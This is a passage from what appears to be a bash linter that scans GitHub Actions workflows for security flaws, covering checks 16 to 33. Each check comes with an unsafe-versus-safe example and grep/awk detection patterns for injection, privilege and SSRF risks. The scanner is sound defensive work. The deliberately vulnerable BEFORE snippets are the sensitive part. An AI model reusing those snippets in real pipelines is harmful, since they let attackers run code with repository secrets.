check_16_severity="HIGH"

example_check_16() {
    cat <<'EOF'
# WHY: Beyond PR title/body (check 1), many other event fields are attacker-
# controlled: workflow_run.head_branch, discussion.title/body, review.body,
# head_commit.message, label.name, etc. These undergo the same ${{ }} macro
# expansion and can inject shell commands when used directly in run: blocks.
#
# BEFORE (unsafe - attacker controls branch name in workflow_run triggers):
  run: echo "Branch: ${{ github.event.workflow_run.head_branch }}"
# AFTER (safe - assign to env var first):
  env:
    HEAD_BRANCH: ${{ github.event.workflow_run.head_branch }}
  run: echo "Branch: ${HEAD_BRANCH}"
EOF
}

check_16() {
    local file="$1"
    local additional_event_fields='github\.event\.(discussion\.(title|body)|review\.body|review_comment\.body|head_commit\.(message|author\.(name|email))|commits\[\*\]\.(message|author)|pages\[\*\]\.page_name|workflow_run\.head_branch|workflow_run\.head_sha|label\.name|milestone\.title)'
    if grep -qE "${additional_event_fields}" "${file}" 2>/dev/null; then
        local unsafe_usage
        unsafe_usage=$(awk -v pattern="${additional_event_fields}" "${AWK_RUN_BLOCK_DETECT}"'
            /^[[:space:]]*(-[[:space:]]+)?run:/ && $0 ~ pattern { print NR; next }
            in_run_block && $0 ~ pattern { print NR }
        ' "${file}" 2>/dev/null)
        if [[ -n "${unsafe_usage}" ]]; then
            log_issue "HIGH" "${file}" "Contains attacker-controlled github.event field directly in run: block - use env var instead" "$(_extract_lines "${unsafe_usage}")"
            return 1
        fi
    fi
    return 0
}

# =============================================================================
# Check 17: actions/github-script with direct expression interpolation
# =============================================================================
check_17_description="github-script with expression interpolation"
check_17_severity="HIGH"

example_check_17() {
    cat <<'EOF'
# WHY: actions/github-script executes JavaScript. When ${{ github.event.* }}
# is interpolated into the script: body, the attacker's data becomes JS source
# code, enabling arbitrary code execution (e.g., closing a string literal and
# injecting require('child_process').execSync(...)). Use process.env instead.
#
# BEFORE (unsafe - JS injection via issue title):
  uses: actions/github-script@v7
  with:
    script: |
      const title = "${{ github.event.issue.title }}";
      console.log(title);
# AFTER (safe - read from env var via process.env):
  uses: actions/github-script@v7
  env:
    ISSUE_TITLE: ${{ github.event.issue.title }}
  with:
    script: |
      const title = process.env.ISSUE_TITLE;
      console.log(title);
EOF
}

check_17() {
    local file="$1"
    if grep -qE 'actions/github-script' "${file}" 2>/dev/null; then
        local unsafe_usage
        unsafe_usage=$(awk '
            BEGIN { in_action = 0; in_script = 0; script_indent = 0 }
            /uses:.*actions\/github-script/ { in_action = 1; next }
            in_action && /^[[:space:]]*script:[[:space:]]*\|/ {
                match($0, /^[[:space:]]*/); script_indent = RLENGTH; in_script = 1; next
            }
            in_action && /^[[:space:]]*script:/ && /\$\{\{.*github\.event\./ { print NR; next }
            in_script {
                if ($0 ~ /^[[:space:]]*-[[:space:]]/) { in_script = 0; in_action = 0; next }
                match($0, /^[[:space:]]*/); curr_indent = RLENGTH
                if (curr_indent <= script_indent && $0 ~ /^[[:space:]]*[a-z_-]+:/) { in_script = 0; in_action = 0; next }
            }
            in_script && /\$\{\{.*github\.event\./ { print NR }
        ' "${file}" 2>/dev/null)
        if [[ -n "${unsafe_usage}" ]]; then
            log_issue "HIGH" "${file}" "actions/github-script contains \${{ github.event.* }} in script body - JavaScript injection risk" "$(_extract_lines "${unsafe_usage}")"
            return 1
        fi
    fi
    return 0
}

# =============================================================================
# Check 18: secrets.* directly interpolated in run blocks
# =============================================================================
check_18_description="secrets interpolation in run blocks"
check_18_severity="HIGH"

example_check_18() {
    cat <<'EOF'
# WHY: When a secret is expanded via ${{ secrets.* }} directly into a run:
# block, it becomes part of the shell source text. If the step fails, error
# traces or `set -x` output may include the secret value. Using an env var
# keeps the secret out of the shell source and lets the runner mask it.
#
# BEFORE (risky - secret expanded into shell source, may leak in traces):
  run: git remote set-url origin https://${{ secrets.MY_TOKEN }}@github.com/org/repo.git
# AFTER (safe - secret stays in env var, not embedded in shell source):
  env:
    MY_TOKEN: ${{ secrets.MY_TOKEN }}
  run: git remote set-url origin "https://${MY_TOKEN}@github.com/org/repo.git"
EOF
}

check_18() {
    local file="$1"
    if grep -qE '\$\{\{.*secrets\.' "${file}" 2>/dev/null; then
        local unsafe_usage
        unsafe_usage=$(awk "${AWK_RUN_BLOCK_DETECT}"'
            /^[[:space:]]*(-[[:space:]]+)?run:/ && /\$\{\{.*secrets\./ { print NR; next }
            in_run_block && /\$\{\{.*secrets\./ { print NR }
        ' "${file}" 2>/dev/null)
        if [[ -n "${unsafe_usage}" ]]; then
            log_issue "HIGH" "${file}" "Contains \${{ secrets.* }} directly in run: block - pass via env var to avoid exposure in error traces" "$(_extract_lines "${unsafe_usage}")"
            return 1
        fi
    fi
    return 0
}

# =============================================================================
# Check 19: matrix.* directly interpolated in run blocks
# =============================================================================
check_19_description="matrix.* interpolation in run blocks"
check_19_severity="MEDIUM"

example_check_19() {
    cat <<'EOF'
# WHY: Matrix values can originate from fromJSON() of an input or external
# source. Even when static, ${{ matrix.* }} in run blocks is a defense-in-
# depth concern — the value is textually pasted into the shell command rather
# than treated as data. Using an env var eliminates injection risk.
#
# BEFORE (matrix value is macro-expanded into shell code):
  run: echo "Testing on ${{ matrix.os }}"
# AFTER (safe - assign to env var, reference as shell variable):
  env:
    MATRIX_OS: ${{ matrix.os }}
  run: echo "Testing on ${MATRIX_OS}"
EOF
}

check_19() {
    local file="$1"
    if grep -qE '\$\{\{.*matrix\.' "${file}" 2>/dev/null; then
        local unsafe_usage
        unsafe_usage=$(awk "${AWK_RUN_BLOCK_DETECT}"'
            /^[[:space:]]*(-[[:space:]]+)?run:/ && /\$\{\{.*matrix\./ { print NR; next }
            in_run_block && /\$\{\{.*matrix\./ { print NR }
        ' "${file}" 2>/dev/null)
        if [[ -n "${unsafe_usage}" ]]; then
            log_issue "MEDIUM" "${file}" "Contains \${{ matrix.* }} directly in run: block - use env var instead" "$(_extract_lines "${unsafe_usage}")"
            return 1
        fi
    fi
    return 0
}

# =============================================================================
# Check 20: github.repository and github.event_name directly in run blocks
# =============================================================================
check_20_description="github.repository/github.event_name interpolation in run blocks"
check_20_severity="LOW"

example_check_20() {
    cat <<'EOF'
# WHY: github.repository and github.event_name are generally trusted, but
# defense-in-depth recommends keeping all expression interpolation out of
# run: blocks. Using env vars costs nothing and prevents future issues if
# these values are ever combined with untrusted data in the same expression.
#
# BEFORE (low risk but inconsistent with defense-in-depth):
  run: gh pr view 123 --repo "${{ github.repository }}"
# AFTER (consistent - use workflow-level env or step env):
  env:
    REPO: ${{ github.repository }}
  run: gh pr view 123 --repo "${REPO}"
EOF
}

check_20() {
    local file="$1"
    if grep -qE '\$\{\{.*(github\.repository[^_]|github\.event_name)' "${file}" 2>/dev/null; then
        local unsafe_usage
        unsafe_usage=$(awk "${AWK_RUN_BLOCK_DETECT}"'
            /^[[:space:]]*(-[[:space:]]+)?run:/ && /\$\{\{.*(github\.repository[^_]|github\.event_name)/ { print NR; next }
            in_run_block && /\$\{\{.*(github\.repository[^_]|github\.event_name)/ { print NR }
        ' "${file}" 2>/dev/null)
        if [[ -n "${unsafe_usage}" ]]; then
            log_issue "LOW" "${file}" "Contains \${{ github.repository }} or \${{ github.event_name }} directly in run: block - prefer env var for defense-in-depth" "$(_extract_lines "${unsafe_usage}")"
            return 1
        fi
    fi
    return 0
}

# =============================================================================
# Check 21: pull_request_target privilege boundary issues
# =============================================================================
check_21_description="pull_request_target privilege boundary issues"
check_21_severity="HIGH"

example_check_21() {
    cat <<'EOF'
# WHY: pull_request_target workflows run with the base repo's GITHUB_TOKEN
# and secrets. Checking out the PR head ref brings untrusted fork code into
# this privileged context. If credentials persist (the default), the forked
# code can use them to push to the base repo, create releases, etc.
#
# BEFORE (unsafe - PR head checkout plus persisted credentials):
  on: pull_request_target
  steps:
    - uses: actions/checkout@v4
      with:
        ref: ${{ github.event.pull_request.head.sha }}
    - uses: ./.github/actions/build
# AFTER (safer - avoid PR head checkout in privileged jobs and do not persist credentials):
  on: pull_request_target
  steps:
    - uses: actions/checkout@v4
      with:
        persist-credentials: false
    - run: ./scripts/label-pr.sh
EOF
}

check_21() {
    local file="$1"
    local found=0

    if ! grep -qE 'pull_request_target' "${file}" 2>/dev/null; then
        return 0
    fi

    local checkout_lines
    checkout_lines=$(grep -nE 'actions/checkout' "${file}" 2>/dev/null || true)
    local head_ref_lines
    head_ref_lines=$(grep -nE 'github\.event\.pull_request\.head\.(sha|ref|repo\.full_name)|github\.head_ref' "${file}" 2>/dev/null || true)

    if [[ -n "${checkout_lines}" ]] && [[ -n "${head_ref_lines}" ]]; then
        log_issue "HIGH" "${file}" "pull_request_target checks out the PR head ref/repository - this can execute untrusted code with base-repository privileges" "$(_extract_lines "${head_ref_lines}")"
        found=1

        if grep -qE '^[[:space:]]*uses:[[:space:]]*\./' "${file}" 2>/dev/null; then
            local local_action_lines
            local_action_lines=$(grep -nE '^[[:space:]]*uses:[[:space:]]*\./' "${file}" 2>/dev/null || true)
            log_issue "HIGH" "${file}" "pull_request_target invokes a local action after untrusted checkout - local action code comes from the checked-out repository" "$(_extract_lines "${local_action_lines}")"
            found=1
        fi
    fi

    if [[ -n "${checkout_lines}" ]] && \
       ! grep -qE 'persist-credentials:[[:space:]]*false' "${file}" 2>/dev/null; then
        log_issue "MEDIUM" "${file}" "pull_request_target uses actions/checkout without persist-credentials: false - the workflow token may remain in git config" "$(_extract_lines "${checkout_lines}")"
        found=1
    fi

    [[ ${found} -eq 0 ]]
}

# =============================================================================
# Check 22: workflow_run privileged follow-up patterns
# =============================================================================
check_22_description="workflow_run privileged follow-up patterns"
check_22_severity="MEDIUM"

example_check_22() {
    cat <<'EOF'
# WHY: workflow_run triggers run with the base repository's privileges
# regardless of the upstream workflow's trigger. If the follow-up job
# downloads artifacts from the upstream run and uses them in a privileged
# context (write tokens/secrets), a malicious PR author can craft artifacts
# that exploit the elevated permissions.
#
# BEFORE (risky - privileged workflow_run job consumes upstream artifacts):
  on: workflow_run
  permissions:
    contents: write
  steps:
    - run: gh run download "${{ github.event.workflow_run.id }}"
# AFTER (safer - keep follow-up job read-only or validate artifacts before privileged use):
  on: workflow_run
  permissions:
    contents: read
  steps:
    - run: ./scripts/verify-artifacts.sh
EOF
}

check_22() {
    local file="$1"
    local found=0

    if ! grep -qE 'workflow_run' "${file}" 2>/dev/null; then
        return 0
    fi

    # Skip if the workflow_run trigger only listens to specific named workflows
    # (internal orchestration pattern - the triggering workflows are trusted)
    if awk '
        /^[[:space:]]*workflow_run:/ { in_wr = 1; next }
        in_wr && /^[[:space:]]*workflows:/ { has_filter = 1 }
        in_wr && /^[a-z]/ { exit }
        END { exit !has_filter }
    ' "${file}" 2>/dev/null; then
        return 0
    fi

    local artifact_hits
    artifact_hits=$(grep -nE 'github\.event\.workflow_run\.id|gh[[:space:]]+run[[:space:]]+download|dawidd6/action-download-artifact|/actions/artifacts|run_id:[[:space:]]*\$\{\{[[:space:]]*github\.event\.workflow_run\.id' "${file}" 2>/dev/null || true)
    if [[ -n "${artifact_hits}" ]] && \
       grep -qE 'secrets:[[:space:]]*inherit|\$\{\{[[:space:]]*secrets\.|write-all|contents:[[:space:]]*write|actions:[[:space:]]*write|packages:[[:space:]]*write|pull-requests:[[:space:]]*write|id-token:[[:space:]]*write|uses:[[:space:]]*actions/checkout' "${file}" 2>/dev/null; then
        log_issue "MEDIUM" "${file}" "workflow_run downloads or references upstream run artifacts while also having elevated capabilities - validate artifacts before privileged use" "$(_extract_lines "${artifact_hits}")"
        found=1
    fi

    [[ ${found} -eq 0 ]]
}

# =============================================================================
# Check 23: self-hosted runners on untrusted triggers
# =============================================================================
check_23_description="self-hosted runners on untrusted triggers"
check_23_severity="HIGH"

example_check_23() {
    cat <<'EOF'
# BEFORE (risky - public PRs can reach self-hosted infrastructure):
  on: pull_request
  jobs:
    test:
      runs-on: [self-hosted, linux]
# AFTER (safer - use GitHub-hosted runners for untrusted events):
  on: pull_request
  jobs:
    test:
      runs-on: ubuntu-latest
EOF
}

check_23() {
    local file="$1"
    # SC2310: has_untrusted_trigger returns 0/1 for match/no-match; errors are
    # already silenced by 2>/dev/null inside it.  set -e suppression here is
    # intentional — a grep "error" should be treated as "no match", not abort.
    # shellcheck disable=SC2310
    if has_untrusted_trigger "${file}"; then
        local hits
        hits=$(grep -nE 'self-hosted' "${file}" 2>/dev/null || true)
        if [[ -n "${hits}" ]]; then
            log_issue "HIGH" "${file}" "Untrusted trigger targets a self-hosted runner - isolate self-hosted runners from public-input workflows" "$(_extract_lines "${hits}")"
            return 1
        fi
    fi
    return 0
}

# =============================================================================
# Check 24: write-capable permissions on untrusted triggers
# =============================================================================
check_24_description="write-capable permissions on untrusted triggers"
check_24_severity="MEDIUM"

example_check_24() {
    cat <<'EOF'
# WHY: When a workflow triggered by pull_request, issue_comment, or issues has
# write permissions, a compromised or malicious step can modify repository
# contents, merge PRs, publish packages, etc. Minimizing token scopes limits
# the blast radius of any injection vulnerability in the workflow.
#
# BEFORE (risky - untrusted trigger gets write-capable token scopes):
  on: pull_request_target
  permissions:
    contents: write
    pull-requests: write
# AFTER (safer - keep token read-only unless a separate trusted job needs elevation):
  on: pull_request_target
  permissions:
    contents: read
EOF
}

check_24() {
    local file="$1"
    local scoped_write
    # SC2310: same rationale as check_23 — false return means "no match", not a
    # fatal error.  Separate invocation would re-introduce the set +e toggle.
    # shellcheck disable=SC2310
    has_untrusted_trigger "${file}" || return 0

    scoped_write=$(awk '
        /^[[:space:]]*permissions:[[:space:]]*.*write/ { print NR; next }
        /^[[:space:]]*(actions|attestations|checks|contents|deployments|discussions|id-token|issues|packages|pages|pull-requests|repository-projects|security-events|statuses):[[:space:]]*write([[:space:]]|$)/ { print NR }
    ' "${file}" 2>/dev/null)

    if [[ -n "${scoped_write}" ]] && ! grep -qE 'permissions:[[:space:]]*write-all|write-all' "${file}" 2>/dev/null; then
        log_issue "MEDIUM" "${file}" "Untrusted trigger requests write-capable token scopes - keep permissions minimal and isolate privileged jobs" "$(_extract_lines "${scoped_write}")"
        return 1
    fi
    return 0
}

# =============================================================================
# Check 25: Mutable container and docker:// image references
# =============================================================================
check_25_description="mutable container and docker image references"
check_25_severity="MEDIUM"

example_check_25() {
    cat <<'EOF'
# WHY: Container image tags (like :latest or :v2) are mutable — the registry
# owner can push new content under the same tag at any time. A compromised
# image can execute arbitrary code inside the job container. Pinning to
# @sha256: digests ensures the exact image layers you audited are used.
#
# BEFORE (mutable image tags can be retargeted):
  container:
    image: ghcr.io/example/build-env:latest
  steps:
    - uses: docker://alpine:3.20
# AFTER (pin to immutable digests):
  container:
    image: ghcr.io/example/build-env@sha256:0123456789abcdef...
  steps:
    - uses: docker://alpine@sha256:0123456789abcdef...
EOF
}

check_25() {
    local file="$1"
    local found=0
    local mutable_docker_uses
    local mutable_images

    mutable_docker_uses=$(awk '
        /^[[:space:]]*-[[:space:]]*uses:[[:space:]]*docker:\/\// || /^[[:space:]]*uses:[[:space:]]*docker:\/\// {
            ref = $0
            sub(/^[[:space:]]*-[[:space:]]*uses:[[:space:]]*docker:\/\//, "", ref)
            sub(/^[[:space:]]*uses:[[:space:]]*docker:\/\//, "", ref)
            sub(/[[:space:]]+#.*$/, "", ref)
            gsub(/^[\"\047]|[\"\047]$/, "", ref)
            if (ref !~ /@sha256:[a-f0-9]{64}$/) {
                print NR
            }
        }
    ' "${file}" 2>/dev/null)

    if [[ -n "${mutable_docker_uses}" ]]; then
        log_issue "MEDIUM" "${file}" "Uses docker:// image reference without an immutable @sha256 digest" "$(_extract_lines "${mutable_docker_uses}")"
        found=1
    fi

    mutable_images=$(awk '
        /^[[:space:]]*image:[[:space:]]*/ {
            image = $0
            sub(/^[[:space:]]*image:[[:space:]]*/, "", image)
            sub(/[[:space:]]+#.*$/, "", image)
            gsub(/^[\"\047]|[\"\047]$/, "", image)

            if (image == "Dockerfile" || image ~ /^\.\//) next
            if (image ~ /^docker-image:\/\//) next
            # Allow internal registry images (tag-based workflow with expression interpolation)
            if (image ~ /^harbor\.ci\.tenstorrent\.net\//) next
            # Allow images that are entirely expression-interpolated (resolved at runtime)
            if (image ~ /^\$\{\{.*\}\}$/) next
            # Allow format() expressions that construct harbor.ci.tenstorrent.net URLs
            if (image ~ /format\(.*harbor\.ci\.tenstorrent\.net/) next
            # Allow conditional expressions that resolve to harbor URLs
            if (image ~ /harbor\.ci\.tenstorrent\.net/) next
            # Allow first-party GHCR images (same org)
            if (image ~ /^ghcr\.io\/tenstorrent\//) next

            if (image !~ /@sha256:[a-f0-9]{64}$/ && image ~ /[\/:]/) {
                print NR
            }
        }
    ' "${file}" 2>/dev/null)

    if [[ -n "${mutable_images}" ]]; then
        log_issue "MEDIUM" "${file}" "Uses container or service images without immutable @sha256 digests" "$(_extract_lines "${mutable_images}")"
        found=1
    fi

    [[ ${found} -eq 0 ]]
}

# =============================================================================
# Check 26: fromJSON() with attacker-controlled input
# =============================================================================
check_26_description="fromJSON() with attacker-controlled input"
check_26_severity="MEDIUM"

example_check_26() {
    cat <<'EOF'
# WHY: fromJSON() parses a string as JSON and returns a structured object used
# by the workflow engine. If the input string comes from an attacker (e.g., a
# workflow_dispatch input or event payload), they can influence matrix
# dimensions, runner labels, or conditional logic in unexpected ways.
#
# BEFORE (risky - fromJSON parses attacker-controlled JSON):
  runs-on: ${{ fromJSON(inputs.runner-label) }}
# AFTER (safe - validate inputs before parsing):
  env:
    LABEL_JSON: ${{ inputs.runner-label }}
  run: |
    # Validate JSON structure before use
    echo "${LABEL_JSON}" | jq -e 'type == "array"' || exit 1
EOF
}

check_26() {
    local file="$1"
    local risky_fromjson

    # Always flag github.event.* in fromJSON()
    risky_fromjson=$(grep -nE '\$\{\{.*fromJSON\([^)]*github\.event\.' "${file}" 2>/dev/null || true)

    if [[ -z "${risky_fromjson}" ]]; then
        # For inputs.* and matrix.*, only flag if the workflow has truly untrusted triggers
        # workflow_call inputs come from trusted callers
        # workflow_dispatch inputs come from authorized repo collaborators
        # schedule has no external inputs
        local has_untrusted_input=0
        if grep -qE '^\s*(pull_request|pull_request_target|issues|issue_comment|repository_dispatch):' "${file}" 2>/dev/null; then
            has_untrusted_input=1
        fi
        if [[ "${has_untrusted_input}" -eq 1 ]]; then
            risky_fromjson=$(grep -nE '\$\{\{.*fromJSON\([^)]*(inputs\.|matrix\.)' "${file}" 2>/dev/null || true)
        fi
    fi

    if [[ -n "${risky_fromjson}" ]]; then
        log_issue "MEDIUM" "${file}" "fromJSON() used with potentially attacker-controlled input (inputs.*, github.event.*, or matrix.*) - validate JSON before parsing" "$(_extract_lines "${risky_fromjson}")"
        return 1
    fi
    return 0
}

# =============================================================================
# Check 27: Dynamic expression interpolation in 'uses:'
# =============================================================================
check_27_description="dynamic expression interpolation in 'uses:'"
check_27_severity="HIGH"

example_check_27() {
    cat <<'EOF'
# WHY: The 'uses:' field determines which action code runs. If it contains
# ${{ }} expressions, an attacker who controls the interpolated value can
# redirect execution to a malicious action or workflow, gaining arbitrary
# code execution with the job's permissions.
#
# BEFORE (unsafe - path traversal via expression):
  uses: ./.github/workflows/${{ inputs.workflow }}.yaml
# AFTER (safe - hardcoded workflow reference with input validation):
  uses: ./.github/workflows/build.yaml
# Or use a switch/if pattern with validated, hardcoded paths
EOF
}

check_27() {
    local file="$1"
    local dynamic_uses

    # Look for ${{ }} expressions in uses: statements
    dynamic_uses=$(awk '
        /^[[:space:]]*-[[:space:]]*uses:[[:space:]]*\$\{\{/ ||
        /^[[:space:]]*uses:[[:space:]]*\$\{\{/ {
            print NR
            next
        }
        /^[[:space:]]*-[[:space:]]*uses:.*\$\{\{/ ||
        /^[[:space:]]*uses:.*\$\{\{/ {
            print NR
        }
    ' "${file}" 2>/dev/null || true)

    if [[ -n "${dynamic_uses}" ]]; then
        log_issue "HIGH" "${file}" "Uses statement contains expression interpolation - can lead to path traversal or execution of unintended workflows" "$(_extract_lines "${dynamic_uses}")"
        return 1
    fi
    return 0
}

# =============================================================================
# Check 28: Cache key injection patterns
# =============================================================================
check_28_description="cache key injection patterns"
check_28_severity="MEDIUM"

example_check_28() {
    cat <<'EOF'
# WHY: GitHub Actions caches are keyed by string. If the cache key contains
# attacker-controlled data, an adversary can craft a key that matches a
# poisoned cache entry, causing the workflow to restore malicious files
# (compiled binaries, node_modules, etc.) into the build.
#
# BEFORE (risky - attacker controls cache key):
  - uses: actions/cache@v4
    with:
      key: ${{ inputs.cache-key }}-deps
# AFTER (safe - use commit SHA or validated identifier):
  - uses: actions/cache@v4
    with:
      key: ${{ github.sha }}-${{ hashFiles('**/lockfiles') }}-deps
EOF
}

check_28() {
    local file="$1"
    local risky_cache

    # Look for actions/cache or cache-related actions with inputs/github.event in keys
    risky_cache=$(awk '
        /^[[:space:]]*-[[:space:]]*uses:.*actions\/cache/ ||
        /^[[:space:]]*uses:.*actions\/cache/ {
            in_cache = 1
            next
        }
        in_cache && /^[[:space:]]*-( |$)/ { in_cache = 0 }
        in_cache && /key:/ && /\$\{\{.*(inputs\.|github\.event\.)/ {
            print NR
            in_cache = 0
        }
    ' "${file}" 2>/dev/null || true)

    if [[ -n "${risky_cache}" ]]; then
        log_issue "MEDIUM" "${file}" "Cache key contains potentially attacker-controlled input - can enable cache poisoning attacks" "$(_extract_lines "${risky_cache}")"
        return 1
    fi
    return 0
}

# =============================================================================
# Check 29: Artifact path expressions
# =============================================================================
check_29_description="artifact path expressions"
check_29_severity="MEDIUM"

example_check_29() {
    cat <<'EOF'
# BEFORE (risky - path traversal via expression):
  - uses: actions/upload-artifact@v4
    with:
      path: ${{ inputs.artifact-path }}
# AFTER (safe - use validated, hardcoded paths with optional filters):
  - uses: actions/upload-artifact@v4
    with:
      path: ./build/
EOF
}

check_29() {
    local file="$1"

    # Always flag github.event.* in artifact paths
    local risky_artifact
    risky_artifact=$(awk '
        /^[[:space:]]*-[[:space:]]*uses:.*actions\/(upload|download)-artifact/ ||
        /^[[:space:]]*uses:.*actions\/(upload|download)-artifact/ {
            in_artifact = 1
            next
        }
        in_artifact && /^[[:space:]]*-( |$)/ { in_artifact = 0 }
        in_artifact && /path:/ && /\$\{\{.*github\.event\./ {
            print NR
            in_artifact = 0
        }
    ' "${file}" 2>/dev/null || true)

    if [[ -z "${risky_artifact}" ]]; then
        # For inputs.*, only flag if the workflow has untrusted input triggers
        # Composite actions and workflow_call-only workflows receive inputs from trusted callers
        local has_untrusted=0
        if grep -qE '^\s*(workflow_dispatch|repository_dispatch|pull_request|pull_request_target|issues|issue_comment):' "${file}" 2>/dev/null; then
            has_untrusted=1
        fi
        if [[ "${has_untrusted}" -eq 1 ]]; then
            risky_artifact=$(awk '
                /^[[:space:]]*-[[:space:]]*uses:.*actions\/(upload|download)-artifact/ ||
                /^[[:space:]]*uses:.*actions\/(upload|download)-artifact/ {
                    in_artifact = 1
                    next
                }
                in_artifact && /^[[:space:]]*-( |$)/ { in_artifact = 0 }
                in_artifact && /path:/ && /\$\{\{.*inputs\./ {
                    print NR
                    in_artifact = 0
                }
            ' "${file}" 2>/dev/null || true)
        fi
    fi

    if [[ -n "${risky_artifact}" ]]; then
        log_issue "MEDIUM" "${file}" "Artifact path contains expression interpolation - can lead to path traversal or unintended file access" "$(_extract_lines "${risky_artifact}")"
        return 1
    fi
    return 0
}

# =============================================================================
# Check 30: URL construction in HTTP clients
# =============================================================================
check_30_description="URL construction in HTTP clients"
check_30_severity="MEDIUM"

example_check_30() {
    cat <<'EOF'
# WHY: When ${{ }} expressions appear in curl/wget URLs, an attacker who
# controls the interpolated value can redirect the HTTP request to an
# arbitrary server (SSRF), potentially exfiltrating secrets via query
# parameters or downloading malicious payloads.
#
# BEFORE (risky - SSRF via expression in URL):
  run: curl -sSL "${{ inputs.download-url }}" -o file.tar.gz
# AFTER (safe - validate URL before use):
  env:
    DOWNLOAD_URL: ${{ inputs.download-url }}
  run: |
    # Validate URL pattern before download
    if [[ ! "${DOWNLOAD_URL}" =~ ^https://trusted\.example\.com/ ]]; then
      echo "Invalid URL"
      exit 1
    fi
    curl -sSL "${DOWNLOAD_URL}" -o file.tar.gz
EOF
}

check_30() {
    local file="$1"
    local risky_curl

    # Look for curl/wget with expression interpolation in URL construction
    # Check both single-line and multi-line run blocks
    # Note: run: can appear as "run:" or "- run:" (in steps list)
    risky_curl=$(awk '
        BEGIN { in_run_block = 0; run_indent = 0 }
        /^[[:space:]]*-?[[:space:]]*run:[[:space:]]*\|/ {
            match($0, /^[[:space:]]*/); run_indent = RLENGTH; in_run_block = 1; next
        }
        /^[[:space:]]*-?[[:space:]]*run:/ {
            # Single-line run statement
            if (/curl.*\$\{\{/ || /wget.*\$\{\{/) {
                print NR
            }
            next
        }
        in_run_block {
            if ($0 ~ /^[[:space:]]*-[[:space:]]/) { in_run_block = 0; next }
            match($0, /^[[:space:]]*/); curr_indent = RLENGTH
            if (curr_indent <= run_indent && $0 ~ /^[[:space:]]*[a-z_-]+:/) { in_run_block = 0; next }
            if (/curl.*\$\{\{/ || /wget.*\$\{\{/) {
                print NR
            }
        }
    ' "${file}" 2>/dev/null || true)

    if [[ -n "${risky_curl}" ]]; then
        log_issue "MEDIUM" "${file}" "curl/wget command contains expression interpolation in URL - can lead to SSRF or downloading from attacker-controlled servers" "$(_extract_lines "${risky_curl}")"
        return 1
    fi
    return 0
}

# =============================================================================
# Check 31: Container volume mount expressions
# =============================================================================
check_31_description="container volume mount expressions"
check_31_severity="MEDIUM"

example_check_31() {
    cat <<'EOF'
# WHY: Container volume mounts map host paths into the container. If an
# attacker controls the mount path via expression interpolation, they can
# mount sensitive host directories (like /etc, /root, or the Docker socket)
# into the container, enabling container escape or host compromise.
#
# BEFORE (risky - container escape via expression):
  container:
    image: ubuntu:latest
    volumes:
      - ${{ inputs.mount-path }}:/workspace
# AFTER (safe - hardcoded volume mounts):
  container:
    image: ubuntu:latest
    volumes:
      - /workspace:/workspace
EOF
}

check_31() {
    local file="$1"
    local risky_volume

    # Look for volumes: sections with expression interpolation
    # Allow safe patterns:
    #   - github.workspace, github.action_path, runner.temp, runner.tool_cache
    #   - Conditional expressions that select between hardcoded paths
    #     (e.g., contains(inputs.runner, 'viommu') && '/dev/hugepages...' || '/no_hugepages')
    #   - matrix/inputs used only in contains() or == checks with hardcoded path results
    risky_volume=$(awk '
        /^[[:space:]]*volumes:/ {
            in_volumes = 1
            next
        }
        in_volumes && /^[[:space:]]*-[[:space:]]*\$\{\{/ {
            # Accumulate multi-line ${{ }} expressions
            expr_line = $0
            while (expr_line !~ /\}\}/ && (getline nextline) > 0) {
                expr_line = expr_line " " nextline
            }
            # Skip safe contexts: github.workspace, runner.*, github.action_path
            if (expr_line ~ /\$\{\{[[:space:]]*(github\.workspace|runner\.(temp|tool_cache)|github\.action_path)/) {
                next
            }
            # Skip conditional mount patterns that select between hardcoded paths
            if (expr_line ~ /contains\(/ && expr_line ~ /\/[a-zA-Z_]/) {
                next
            }
            # Skip ternary-style patterns: inputs/matrix check && literal-path || literal-path
            if (expr_line ~ /(inputs\.|matrix\.).*&&.*\/[a-zA-Z_].*\|\|.*\/[a-zA-Z_]/) {
                next
            }
            # Skip format() with hardcoded path templates
            if (expr_line ~ /format\(/) {
                next
            }
            print NR
        }
        in_volumes && /^[[:space:]]*[a-z_-]+:/ && !/volumes:/ { in_volumes = 0 }
    ' "${file}" 2>/dev/null || true)

    if [[ -n "${risky_volume}" ]]; then
        log_issue "MEDIUM" "${file}" "Container volume mount contains expression interpolation - can lead to container escape or unauthorized host filesystem access" "$(_extract_lines "${risky_volume}")"
        return 1
    fi
    return 0
}

# =============================================================================
# Check 32: Expression interpolation written to GITHUB_ENV/PATH/OUTPUT
# =============================================================================
check_32_description="expression interpolation in GITHUB_ENV/PATH/OUTPUT writes"
check_32_severity="HIGH"

example_check_32() {
    cat <<'EOF'
# WHY: Lines written to GITHUB_ENV set environment variables for all subsequent
# steps. If ${{ }} expressions appear on the same line as the write, the
# attacker's data is expanded before the shell runs, enabling injection of
# variables like LD_PRELOAD (arbitrary library loading) or BASH_ENV (code
# execution on shell startup).
#
# BEFORE (unsafe - expression injected into env file enables LD_PRELOAD/BASH_ENV injection):
  run: echo "BRANCH=${{ github.head_ref }}" >> "${GITHUB_ENV}"
# AFTER (safe - pass via env var, then write shell variable):
  env:
    BRANCH: ${{ github.head_ref }}
  run: echo "BRANCH=${BRANCH}" >> "${GITHUB_ENV}"
EOF
}

check_32() {
    local file="$1"
    if ! grep -qE 'GITHUB_(ENV|PATH|OUTPUT)' "${file}" 2>/dev/null; then
        return 0
    fi
    if ! grep -qE '\$\{\{' "${file}" 2>/dev/null; then
        return 0
    fi

    local unsafe_usage
    unsafe_usage=$(awk "${AWK_RUN_BLOCK_DETECT}"'
        /^[[:space:]]*(-[[:space:]]+)?run:/ && /\$\{\{/ && /GITHUB_(ENV|PATH|OUTPUT)/ { print NR; next }
        in_run_block && /\$\{\{/ && /GITHUB_(ENV|PATH|OUTPUT)/ { print NR }
    ' "${file}" 2>/dev/null)
    if [[ -n "${unsafe_usage}" ]]; then
        log_issue "HIGH" "${file}" "Contains \${{ }} expression on line that writes to GITHUB_ENV/PATH/OUTPUT - enables environment variable injection (LD_PRELOAD, BASH_ENV)" "$(_extract_lines "${unsafe_usage}")"
        return 1
    fi
    return 0
}

# =============================================================================
# Check 33: Missing explicit permissions key (aggregate check)
# =============================================================================
check_33_description="missing explicit permissions key"
check_33_severity="LOW"
check_33_aggregate=true

example_check_33() {
    cat <<'EOF'
# WHY: Without a top-level 'permissions:' key, the workflow inherits the
# repository's default token permissions, which may be overly broad.
# Explicitly declaring permissions ensures least-privilege and makes the
# workflow's capabilities visible in code review.
#
# BEFORE (inherits default, potentially broad permissions):
  on: push
  jobs:
    build: ...
# AFTER (explicit least-privilege):
  on: push
  permissions:
